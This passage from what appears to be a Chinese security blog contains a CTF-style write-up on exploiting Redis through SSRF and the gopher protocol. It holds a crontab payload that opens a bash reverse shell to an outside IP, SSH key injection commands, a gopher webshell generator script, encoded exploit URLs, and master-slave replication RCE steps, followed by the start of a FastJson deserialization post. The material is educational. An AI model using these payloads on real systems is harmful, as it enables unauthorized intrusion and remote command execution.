<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6))); <span class="comment">//存在setValue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-26T12:28:50.000Z" title="2021-04-26T12:28:50.000Z">2021-04-26</time>发表</span><span class="level-item"><time dateTime="2021-04-26T12:31:31.897Z" title="2021-04-26T12:31:31.897Z">2021-04-26</time>更新</span><span class="level-item">10 分钟读完 (大约1560个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">ssrf中gopher+redis的利用总结</a></h1><div class="content"><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>只能在Centos上使用，原因：</p>
<p>1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600，否则会报错。而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也可执行。</p>
<p>2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
<p>3.不同系统中crontrab定时文件位置也会不同Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> ，高版本的redis默认启动是<code>redis</code>权限，所以无法利用。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.133.164.81&#x2F;6666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h1><p>向/root/.ssh中写入公钥即可用ssh登陆服务器，高版本redis少有root权限，难以利用</p>
<p>生成私钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>



<p>redis命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h1 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h1><p>比较常用的方法，以[网鼎杯 2020 玄武组]SSRFMe为例</p>
<p>访问index.php，过滤127.0.0.1，使用<code>http://0.0.0.0</code>绕过，提示要访问hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>读取hint.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure>

<p>hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot; </span></span><br></pre></td></tr></table></figure>



<p>利用<code>dict://</code>访问6379端口，存在redis，前面给出了密码为root</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;dict:&#x2F;&#x2F;0.0.0.0:6379</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/6086b21e53d31.jpg"></p>
<p>利用gopher协议，生成payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop</span><br><span class="line">&gt; python2 G:\工具\ssrf工具\gopherwriteshell2.py</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;10.0.231.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>利用gopher协议，生成payload</p>
<p>把生成的payload进行url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%33%32%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%32%63%61%74%25%32%30%2f%66%6c%61%67%25%32%32%25%32%39%25%33%42%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41</span><br></pre></td></tr></table></figure>



<p>写入成功，得到flag</p>
<p><img src="https://www.hualigs.cn/image/6086b21e63d5c.jpg"></p>
<h1 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h1><p>在docker环境下，一个单一的容器中不会有除redis以外的任何服务存在，如ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下可以利用主从复制执行命令。</p>
<p><strong>主从复制概念</strong></p>
<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。建立主从关系只需要在从节点操作就行了，主节点不用任何操作。</p>
<p><strong>主从复制作用</strong></p>
<p>Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>还是以[网鼎杯 2020 玄武组]SSRFMe为例</p>
<p>需要先下载两个工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a> </p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>实际用到的只有第一个链接中的<code>rogue-server.py</code>和<code>ssrf-redis.py</code>，还有第二个链接中的<code>exp.so</code>，把这三个文件放到一个文件夹里即可</p>
<p>修改ssrf-redis.py中的一些参数</p>
<p>lhost改为vps地址，6666端口为<code>rogue-server.py</code>的运行端口，command为要执行的命令</p>
<p><img src="https://www.hualigs.cn/image/6086b21e6139f.jpg"></p>
<p>ip改为符合要求的0.0.0.0</p>
<p><img src="https://www.hualigs.cn/image/6086b21e55ef0.jpg"></p>
<p>密码改为root</p>
<p><img src="https://www.hualigs.cn/image/6086b21e568de.jpg"></p>
<p>生成payload</p>
<p><img src="https://www.hualigs.cn/image/6086b21e71a9a.jpg"></p>
<p>运行rogue-server.py，建立从节点</p>
<p><img src="https://www.hualigs.cn/image/6086b21e662b0.jpg"></p>
<p>将生成的payload进行url编码后访问，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;44677c4e-0255-433c-aa69-f1ebedb79c08.node3.buuoj.cn&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%35%25%30%44%25%30%41%31%31%38%2e%31%39%35%2e%31%36%36%2e%31%33%38%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/6086b21e68121.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-25T14:06:15.000Z" title="2021-04-25T14:06:15.000Z">2021-04-25</time>发表</span><span class="level-item"><time dateTime="2021-04-25T14:14:12.563Z" title="2021-04-25T14:14:12.563Z">2021-04-25</time>更新</span><span class="level-item">13 分钟读完 (大约1905个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">FastJson反序列化</a></h1><div class="content"><h1 id="Fastjson使用"><a href="#Fastjson使用" class="headerlink" title="Fastjson使用"></a>Fastjson使用</h1><p>astjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java  Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p>
<p>pom.xml设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>



<p>先定义一个User类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    